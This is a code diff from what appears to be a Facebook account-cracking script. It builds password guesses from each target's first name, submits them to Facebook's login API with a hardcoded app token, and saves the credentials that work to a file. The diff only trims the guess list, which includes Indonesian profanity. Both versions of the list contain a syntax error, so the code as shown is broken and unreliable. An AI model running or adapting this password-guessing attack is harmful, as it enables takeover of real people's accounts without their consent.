@@ -115,7 +115,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"01",nama+"1",nama+"11",nama+"111",nama+"02",nama+"22",nama+"222",nama+"03",nama+"33",nama+"333",nama+"99",nama"98",nama+"97",nama+"96",nama+"95",nama+"94",nama+"93",nama+"92",nama+"91",nama+"90",nama+"89",nama+"88",nama+"87",nama+"85",nama+"84",nama+"83",nama+"82",nama+"81",nama+"80","#"+nama,"!"+nama,"+"+nama,"123"+nama,"12345"+nama,"ANJING","KONTOL","@"+nama+"1","BANGSAT","SAYANG"]:
+		for pas in [nama+"01",nama+"1",nama+"02",nama+"03",nama+"99",nama"98",nama+"97",nama+"96","#"+nama,"!"+nama,"+"+nama,"123"+nama,"ANJING","KONTOL","@"+nama+"1","BANGSAT","SAYANG"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
